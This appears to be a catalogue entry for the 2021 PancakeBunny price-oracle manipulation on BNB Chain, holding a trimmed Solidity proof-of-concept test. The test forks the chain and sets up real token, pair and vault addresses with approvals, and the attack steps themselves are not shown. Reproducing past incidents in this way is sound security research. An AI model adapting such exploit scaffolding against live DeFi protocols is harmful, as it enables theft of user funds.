# [?] PancakeBunny - Price Oracle Manipulation

## Summary
Severity: Unknown
Chain: BNB Chain
Component: PancakeBunny
Published: 2021-05-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/PancakeBunny_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address USDT = 0x55d398326f99059fF775485246999027B3197955;
    address BUNNY = 0xC9849E6fdB743d08fAeE3E34dd2D1bc69EA11a51;

    IVaultFlipToFlip flip = IVaultFlipToFlip(0x633e538EcF0bee1a18c2EDFE10C4Da0d6E71e77B);

    IBunnyZap zap = IBunnyZap(0xdC2bBB0D33E0e7Dea9F5b98F46EDBaC823586a0C);

    IPancakeRouter router = IPancakeRouter(payable(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F));

    Uni_Pair_V2 WBNBUSDTv1 = Uni_Pair_V2(0x20bCC3b8a0091dDac2d0BC30F68E6CBb97de59Cd);
    Uni_Pair_V2 WBNBUSDTv2 = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    Uni_Pair_V2 WBNBBUNNY = Uni_Pair_V2(0x7Bb89460599Dbf32ee3Aa50798BBcEae2A5F7f6a);

    Uni_Pair_V2 WBNBCAKE = Uni_Pair_V2(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    Uni_Pair_V2 WBNBBUSD = Uni_Pair_V2(0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16);
    Uni_Pair_V2 WBNBETH = Uni_Pair_V2(0x74E4716E431f45807DCF19f284c7aA99F18a4fbc);
    Uni_Pair_V2 WBNBBTC = Uni_Pair_V2(0x61EB789d75A95CAa3fF50ed7E47b96c132fEc082);
    Uni_Pair_V2 WBNBSAFEMOON = Uni_Pair_V2(0x9adc6Fb78CEFA07E13E9294F150C1E8C1Dd566c0);
    Uni_Pair_V2 WBNBBELT = Uni_Pair_V2(0xF3Bc6FC080ffCC30d93dF48BFA2aA14b869554bb);
    Uni_Pair_V2 WBNBDOT = Uni_Pair_V2(0xDd5bAd8f8b360d76d12FdA230F8BAF42fe0022CF);
    Uni_Pair_V2[] pairs = [WBNBCAKE, WBNBBUSD, WBNBETH, WBNBBTC, WBNBSAFEMOON, WBNBBELT, WBNBDOT];

    IFortubeBank FortubeBank = IFortubeBank(0x0cEA0832e9cdBb5D476040D58Ea07ecfbeBB7672);

    address keeper = 0x793074D9799DC3c6039F8056F1Ba884a73462051;

    constructor() public {
        cheat.createSelectFork("bsc", 7_556_330);

        IERC20(WBNB).approve(address(zap), 1e18);
        IERC20(address(WBNBUSDTv2)).approve(address(flip), type(uint256).max);
        IERC20(address(USDT)).approve(address(router), type(uint256).max);
        IERC20(address(WBNB)).approve(address(router), type(uint256).max);
    }
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/PancakeBunny_exp.sol_
